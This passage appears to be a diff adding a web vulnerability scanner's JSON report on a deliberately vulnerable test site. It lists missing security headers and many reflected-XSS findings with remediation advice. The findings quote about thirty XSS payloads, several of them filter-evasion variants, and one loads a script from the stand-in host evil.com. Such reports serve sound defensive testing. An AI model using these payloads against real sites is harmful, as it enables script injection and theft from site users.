@@ -1,0 +1,1011 @@
+{
+  "scan_id": "enhanced-scan-20250401171945",
+  "url": "http://testphp.vulnweb.com/",
+  "timestamp": "2025-04-01T17:19:45.248469",
+  "scan_duration": 502.2847,
+  "vulnerabilities": {
+    "Basic": [
+      {
+        "id": "b474e452-954d-4197-883b-275f05d42c83",
+        "name": "Missing HSTS Header",
+        "description": "HTTP Strict Transport Security header is missing, which helps protect against protocol downgrade attacks",
+        "severity": "medium",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header Strict-Transport-Security not found in response",
+        "remediation": "Add the Strict-Transport-Security header with a max-age of at least 31536000 (1 year) and includeSubDomains directive"
+      },
+      {
+        "id": "c29a833a-3637-49d2-b3fa-97a666b699db",
+        "name": "Missing Content Security Policy",
+        "description": "Content Security Policy header is missing, which helps mitigate XSS and other code injection attacks",
+        "severity": "medium",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header Content-Security-Policy not found in response",
+        "remediation": "Implement a Content Security Policy with appropriate directives for your site"
+      },
+      {
+        "id": "6ac12a8e-f876-487c-92a1-87f9c740f5cd",
+        "name": "Missing X-Frame-Options Header",
+        "description": "X-Frame-Options header is missing, which can lead to clickjacking attacks",
+        "severity": "medium",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header X-Frame-Options not found in response",
+        "remediation": "Add the X-Frame-Options header with DENY or SAMEORIGIN value"
+      },
+      {
+        "id": "10075a64-0dec-40bc-b5ea-00f3667b6e6e",
+        "name": "Missing X-Content-Type-Options Header",
+        "description": "X-Content-Type-Options header is missing, which can lead to MIME sniffing attacks",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header X-Content-Type-Options not found in response",
+        "remediation": "Add the X-Content-Type-Options header with nosniff value"
+      },
+      {
+        "id": "93a1804c-866b-44a6-862a-629cd93b8394",
+        "name": "Missing X-XSS-Protection Header",
+        "description": "X-XSS-Protection header is missing, which can help prevent XSS attacks in older browsers",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header X-XSS-Protection not found in response",
+        "remediation": "Add the X-XSS-Protection header with 1; mode=block value"
+      },
+      {
+        "id": "6220d9b6-2446-478d-9c24-7a522e1bc4ae",
+        "name": "Missing Referrer-Policy Header",
+        "description": "Referrer-Policy header is missing, which controls how much referrer information is included with requests",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header Referrer-Policy not found in response",
+        "remediation": "Add the Referrer-Policy header with appropriate value like no-referrer or same-origin"
+      },
+      {
+        "id": "79b7d1de-d199-4efd-9538-684c9343b4eb",
+        "name": "Missing Permissions-Policy Header",
+        "description": "Permissions-Policy header is missing, which controls which browser features can be used",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header Permissions-Policy not found in response",
+        "remediation": "Add the Permissions-Policy header to restrict access to sensitive browser features"
+      },
+      {
+        "id": "43684bbd-250c-4bd6-acc6-62bef13c41a5",
+        "name": "Missing Clear-Site-Data Header on Logout",
+        "description": "Clear-Site-Data header can be used to clear browsing data associated with a site during logout",
+        "severity": "info",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header Clear-Site-Data not found in response",
+        "remediation": "Consider adding Clear-Site-Data header to logout responses"
+      },
+      {
+        "id": "1de98450-7cd6-475a-91d0-38eec3d41a12",
+        "name": "Server Information Disclosure",
+        "description": "Server header reveals information about the server software: nginx/1.19.0",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Configure the server to hide version information"
+      },
+      {
+        "id": "fca8e445-f367-4643-ae39-3e8a5d7912d8",
+        "name": "X-Powered-By Information Disclosure",
+        "description": "X-Powered-By header reveals information about the server technology: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+        "remediation": "Remove the X-Powered-By header"
+      },
+      {
+        "id": "949f44ca-353e-4bf9-9b48-8e7ddf8c229c",
+        "name": "Insecure HTTP",
+        "description": "The website is using HTTP instead of HTTPS, which means data is transmitted in plaintext",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "URL uses HTTP protocol",
+        "remediation": "Configure the server to use HTTPS and redirect HTTP to HTTPS"
+      },
+      {
+        "id": "a1ec68ec-241b-45f7-81f5-4f6c8c628616",
+        "name": "Open Port: 80 (HTTP)",
+        "description": "Port 80 (HTTP - Hypertext Transfer Protocol) is open on testphp.vulnweb.com",
+        "severity": "low",
+        "location": "testphp.vulnweb.com:80",
+        "evidence": "Port 80 is open",
+        "remediation": "Close port 80 if not needed or restrict access with a firewall"
+      }
+    ],
+    "XSS": [
+      {
+        "id": "75a58586-b628-490a-b607-980b90ed6e01",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<script>alert('ykYaX8fe')</script>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "5658fadc-032f-4ae7-a0fd-4b2c2d84bf30",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<script>alert(document.domain)</script>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "3764ae40-f207-454c-a61d-b5cb6683ff47",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<img src=x onerror=alert('8SAn6fNn')>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "baa8aa61-3316-4168-806f-c2cdf7d82d75",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<svg onload=alert('Pr1a1rg5')>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "0b7858cb-5ea5-44ed-a5f5-f7a1a0a7db3f",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<body onload=alert('flSg3jV1')>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "23cd0bd7-323b-4c94-8f8b-e13166e6ce9a",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<iframe onload=alert('HI3uMwEg')></iframe>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "1eefa37b-c44c-4f13-b346-9d15c2e4984f",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<input autofocus onfocus=alert('QaeSsdDy')>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "fb0c5858-7190-4ec6-85df-1dda75d7fc3b",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<select autofocus onfocus=alert('mUeBG7p7')>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "7cd294ce-85cb-4af8-8cbe-5e7e45855cb1",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<textarea autofocus onfocus=alert('HCv3mdE0')>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "a7845c38-1ba0-40ff-9a3c-d14f95ec7c01",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<keygen autofocus onfocus=alert('FUaedUMb')>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "df44d7c1-e010-43d5-abe9-b50e1e5b35d4",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<video><source onerror=alert('x6JloKzB')>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "f8ce7034-589e-4cac-9a5d-459ec0ecf149",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<audio><source onerror=alert('Ga5BU0GP')>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "cecfea71-a2ff-4030-b73f-810bde52fd36",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload 'javascript:alert('xlaLp0He')' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "ecf406e9-1e36-4ea3-8197-827b6ddb66ae",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<a href=\"javascript:alert('r4tMzAos')\">Click me</a>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "f4477ffb-3519-4d2b-83cf-44559a5c2a5d",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<a href=javascript:alert('Tz1MphMk')>Click me</a>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "1d882441-2221-485a-87bd-4fe2eb009fc8",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<div style=\"background-image: url(javascript:alert('TCHGIgH9'))\">' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "d20d64fc-7f71-4b33-b293-fa9b7707293e",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<div style=width:expression(alert('11Z1X3dp'))>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "2278c95f-fc69-4cc5-afea-95f7446b4e31",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<style>@import 'javascript:alert(\"utWeNWp6\")';</style>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "55dde6ec-312b-4d8e-ad0a-f9f30a54eb7e",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<object data=\"javascript:alert('vTcVaO1O')\"></object>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "ad986a11-2201-4034-a6ad-15af3f0f40cc",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<embed src=\"javascript:alert('TgLKrRdj')\"></embed>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "1e028416-e4cd-45ac-9d6e-b4d7b35925a1",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<form action=\"javascript:alert('yVdxBsYY')\"><input type=submit>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "73fdb922-a8f6-4c73-b077-77b3912f30c5",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<isindex action=\"javascript:alert('is0ruxaT')\" type=submit value=click>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "f0c92fc0-b08f-4dfa-b44a-16a59bc75948",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<form><button formaction=javascript:alert('vAV4sVOs')>click' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "536c3bbb-e2bc-489c-92ce-43ed3daf8796",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<math><a xlink:href=\"javascript:alert('nXoi5ED1')\">click' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "8262fd47-29c2-4447-9486-f7f2ab50da3d",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<script>prompt('PzTi7AB4')</script>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "eef0eb57-08c6-4f36-ae0e-703faf47fa7c",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<script>confirm('QMZL1kpe')</script>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "1b25e579-d481-4baf-a6a3-4dead8bc8c19",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<script src=data:text/javascript,alert('PfNmHAkS')></script>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "37d42c5d-c97e-460a-8c3a-10a2a7ced719",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<script src=\"data:text/javascript,alert('IJoqg6y3')\"></script>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "b2fd0d38-aba0-48c2-b5b8-e2fdfbbe6a7d",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<script src=//evil.com/xss.js></script>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "f1fe5c68-373d-4b40-ab92-c099e5a51f9e",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "2e98bbd5-24ac-484b-bf52-b0182eb7afbb",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<scr<script>ipt>alert('IXGGc1i2')</scr<script>ipt>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
